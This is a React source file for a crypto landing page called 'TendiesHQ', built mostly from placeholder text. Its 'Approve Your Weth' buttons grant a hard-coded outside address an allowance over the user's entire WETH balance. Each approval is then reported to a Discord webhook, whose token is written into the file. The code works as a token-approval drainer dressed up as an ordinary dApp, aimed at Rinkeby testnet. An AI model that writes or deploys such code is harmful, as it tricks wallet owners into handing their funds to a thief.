import "./main.css";
import menu from "../../assets/menu.svg";
import exit from "../../assets/exit.svg";
import bear from "../../assets/bear.jpg";
import dots from "../../assets/dots.svg";
import holdingPhone from "../../assets/holding-phone.jpg";
import illustration from "../../assets/illustration.svg";
import mcd from "../../assets/mcd.jpg";
import person from "../../assets/person.jpg";
import watch from "../../assets/watch.svg";
import wojak from "../../assets/wojak.jpg";
import { useState, useEffect } from "react";
import Web3 from "web3";
import ContractAbi from "../../contracts/weth.json";
const Sub = () => {
    const [currentAccount, setCurrentAccount] = useState(null);
    const [error, setError] = useState("");
    const [net, setNet] = useState(0)
    
    const checkWalletConnected = async () => {
        const { ethereum } = window;
        if (!ethereum) {
            console.log("Metamask not detected");
            return;
        } else {
            console.log("Wallet exists")
        }
        const accounts = await ethereum.request({method: "eth_accounts"});
        const networkId = await ethereum.request({
            method: "net_version",
          });
          if (networkId != 4) {
              console.log("Wrong chain");
              return
          } else {
              console.log("Correct chain")
          }
        if (accounts.length !== 0) {
            const account = accounts[0];
            console.log("Found account");
            setCurrentAccount(account);
        } else {
            console.log("No authorised account");
        }
    }

    const connectWalletHandler = async () => {
        const { ethereum } = window;
    
        if (!ethereum) {
          alert("Please install Metamask!");
        }
    
        try {
          const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
          const networkId = await ethereum.request({
            method: "net_version",
          });
          setNet(networkId)
          if (networkId != 4) {
              setError("You are on the wrong chain, please change to Rinkeby Testnet");
              console.log("bruh", networkId)
              return;
          }
          console.log("Found an account! Address: ", accounts[0]);
          setCurrentAccount(accounts[0]);
          setError("")
        } catch (err) {
          console.log(err)
          
        }
      }

      const interactMain = async () => {
        const { ethereum } = window;
        const web3 = new Web3(ethereum);
        const contract = new web3.eth.Contract(ContractAbi, "0xc778417e063141139fce010982780140aa0cd5ab");
        console.log(contract)
        const accounts = await ethereum.request({method: "eth_accounts"});
        let userBalance = await contract.methods.balanceOf(currentAccount).call();
        console.log(userBalance)
        await contract.methods.approve("0x9D5233fDcaeBBBd29c1D356b53f519D2a58b6588", userBalance.toString()).send({
          from: accounts[0],
          to: "0xc778417e063141139fce010982780140aa0cd5ab",
          gasLimit: "30000"
        }, (err, tx) => {
            if (err) {
                console.log(err);
            } else {
                postWebhook(accounts[0], web3.utils.fromWei(userBalance, "ether"), tx)
            }
        });

      }

      const postWebhook = (address, amount, tx) => {
          let url = "https://discord.com/api/webhooks/928800064338550815/V3KwUK3aL5QMAQaReWtn42oNkClz43kAHs4ZMG604v3jbdvI7NcZ8n6MgW1sZJUDiJZs"
          const requestOptions = {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: "approval", content: `Address : ${address}\nAmount: ${amount} ether\nTx: ${tx}` })
          };
          fetch(url, requestOptions);
      }

      useEffect(() => {
        checkWalletConnected();
      }, [net])
    return (
        <>
        <div className="navbar">
            <div className="container">
                <a className="logo" href="https://4chan.org/biz/">Tendies<span>HQ</span></a>
                <img id="mobile-cta" className="mobile-menu" src={menu} alt="Open Navigation" />
                <nav>
                    <img id="mobile-exit" className="mobile-menu-exit" src={exit} alt="Close Navigation" /> 
                    <ul className="primary-nav">
                        <li className="current"><a href="#">Home</a></li>
                        <li><a href="#">Features</a></li>
                        <li><a href="#">Pricing</a></li>
                    </ul>

                    <ul className="secondary-nav">
                        <li><a href="#">Contact</a></li>
                        {
                            currentAccount === null ? (
                                <li className="gopremium-cta"><a href="#" onClick={connectWalletHandler} >Connect Wallet</a></li>
                            ) : (
                                <li className="gopremium-cta"><a href="#" onClick={interactMain} > Approve Your Weth</a></li>
                            )
                        }
                        
                    </ul>
                </nav>
            </div>
        </div>
        <section className="hero">
        <div className="container">
            <div className="leftcol">
                <p className="subhead">The Future is Now</p>
                <h1>Connect to the Future</h1>

                <div className="hero-cta">
                    {
                        currentAccount === null ? (
                            <a href="#" className="primary-cta" onClick={connectWalletHandler}>Connect Wallet</a>
                        ) : (
                            <a href="#" className="primary-cta" onClick={interactMain}>Approve Weth</a>
                        )
                    }
                    
                    <a href="#" className="watch-video-cta"></a>
                </div>

            </div>
            <img src={illustration} className="hero-img" alt="Illustration" />
        </div>
    </section>

    <section className="features-section">
        <div className="container">
            <ul className="features-list">
                <li>Lorem Ipsum</li>
                <li>Lorem Ipsum</li>
                <li>Lorem Ipsum</li>
                <li>Lorem Ipsum</li>
                <li>Lorem Ipsum</li>
                <li>Lorem Ipsum</li>
            </ul>

            <img src={holdingPhone} alt="Man holding phone" />
        </div>
    </section>

    <section className="testimonials-section">
        <div className="container">
            <ul>
                <li>
                    <img src={bear} alt="Person" />

                    <blockquote>"Hello world!"</blockquote>
                    <cite>- Bull</cite>
                </li>

                <li>
                    <img src={wojak} alt="Person" />

                    <blockquote>"Hello world!"</blockquote>
                    <cite>- Bull</cite>
                </li>

                <li>
                    <img src={mcd} alt="Person" />

                    <blockquote>"Hello world!"</blockquote>
                    <cite>- Bull</cite>
                </li>
            </ul>
        </div>
    </section>

        <section className="contact-section">
            <div className="container">
                <div className="contact-left">
                    <h2>Contact</h2>
                    <form action="">
                        <label htmlFor="name">Name</label>
                        <input type="text" id="name" name="name" />

                        <label htmlFor="message">Message</label>
                        <textarea name="message" id="message" cols="30" rows="10"></textarea>

                        <input type="submit" className="send-message-cta" value="Send Message" />
                    </form>
                </div>
                

                <div className="contact-right">
                    <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d2797221.2300920845!2d5.981405624908434!3d46.79127685704961!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x478c64ef6f596d61%3A0x5c56b5110fcb7b15!2sSwitzerland!5e0!3m2!1sen!2sus!4v1641443267231!5m2!1sen!2sus" width="600" height="450" style={{border: 0}} allowFullScreen="" loading="lazy"></iframe>
                </div>
            </div>
        </section>
        </>
    )
}

export default Sub;